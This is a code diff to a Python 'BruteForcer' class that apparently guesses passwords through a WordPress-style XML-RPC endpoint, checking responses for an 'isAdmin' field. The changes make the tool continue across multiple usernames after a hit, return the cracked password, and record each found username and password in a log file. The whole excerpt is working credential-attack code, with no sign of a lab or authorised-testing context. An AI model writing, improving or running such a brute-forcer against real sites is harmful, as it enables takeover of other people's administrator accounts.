@@ -148,6 +148,11 @@ class BruteForcer:
                         # we test the password
                         found = self.testPassword(username, word)
                         passwords_tested = passwords_tested + 1
+                        if found != False:
+                            print(f"✅ Password found ! → The password '{word}' is valid for the user '{username}' !")
+                            with open("log/passwords.log", "a", encoding="utf-8") as passfile:
+                                passfile.write(f"Pw for {username}: {word}\n")
+                            break # We break to bruteforce for next user
 
                     # Some logging...
                     if time.time() - time_start >= 3:
@@ -156,6 +161,11 @@ class BruteForcer:
 
                     if passwords_tested % 50 == 0:
                         print(f"Tested {passwords_tested} passwords so far")
+
+        if found == False:
+            print(f"❌ No password found for user {username}")
+
+            
                 
 
     # Usus xmlrpc to check if a given password works for a given user.
@@ -206,8 +216,7 @@ class BruteForcer:
             return False
 
         if '<name>isAdmin</name>' in response.text:
-            print(f"✅ SUCCESS → The password '{password}' is valid for the user '{username}' !")
-            die()
+            return password
 
         return False
         
